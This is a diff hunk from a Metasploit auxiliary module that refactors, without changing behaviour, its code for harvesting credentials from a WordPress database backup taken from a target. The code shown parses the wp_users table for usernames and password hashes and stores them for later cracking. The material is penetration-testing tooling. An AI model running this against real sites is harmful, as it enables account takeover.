@@ -125,47 +125,46 @@ class MetasploitModule < Msf::Auxiliary
       path.split('/').last
     )
     print_good("#{ip} - Database backup (#{res.body.bytesize} bytes) saved in: #{path}")
-    begin
-      Zip::File.open(path) do |zip_file|
-        # Handle entries one by one
-        zip_file.each do |entry|
-          # Extract to file
-          next unless entry.name.ends_with?('.sql')
 
-          print_status("#{ip} - Attempting to pull creds from #{entry}")
-          f = entry.get_input_stream.read
-          f.split("\n").each do |l|
-            next unless l.include?('INSERT INTO `wp_users` VALUES ')
+    Zip::File.open(path) do |zip_file|
+      # Handle entries one by one
+      zip_file.each do |entry|
+        # Extract to file
+        next unless entry.name.ends_with?('.sql')
 
-            columns = ['user_login', 'user_pass']
-            table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
-            l.split('),(').each do |user|
-              user = user.split(',')
-              username = user[1].strip
-              username = username.start_with?("'") ? username.gsub("'", '') : username
-              hash = user[2].strip
-              hash = hash.start_with?("'") ? hash.gsub("'", '') : hash
-              create_credential({
-                workspace_id: myworkspace_id,
-                origin_type: :service,
-                module_fullname: fullname,
-                username: username,
-                private_type: :nonreplayable_hash,
-                jtr_format: identify_hash(hash),
-                private_data: hash,
-                service_name: 'Wordpress',
-                address: ip,
-                port: datastore['RPORT'],
-                protocol: 'tcp',
-                status: Metasploit::Model::Login::Status::UNTRIED
-              })
-              table << [username, hash]
-            end
-            print_good(table.to_s)
+        print_status("#{ip} - Attempting to pull creds from #{entry}")
+        f = entry.get_input_stream.read
+        f.split("\n").each do |l|
+          next unless l.include?('INSERT INTO `wp_users` VALUES ')
+
+          columns = ['user_login', 'user_pass']
+          table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
+          l.split('),(').each do |user|
+            user = user.split(',')
+            username = user[1].strip
+            username = username.start_with?("'") ? username.gsub("'", '') : username
+            hash = user[2].strip
+            hash = hash.start_with?("'") ? hash.gsub("'", '') : hash
+            create_credential({
+              workspace_id: myworkspace_id,
+              origin_type: :service,
+              module_fullname: fullname,
+              username: username,
+              private_type: :nonreplayable_hash,
+              jtr_format: identify_hash(hash),
+              private_data: hash,
+              service_name: 'Wordpress',
+              address: ip,
+              port: datastore['RPORT'],
+              protocol: 'tcp',
+              status: Metasploit::Model::Login::Status::UNTRIED
+            })
+            table << [username, hash]
           end
+          print_good(table.to_s)
         end
       end
-      print_status("#{ip} - finished processing backup zip")
     end
+    print_status("#{ip} - finished processing backup zip")
   end
 end
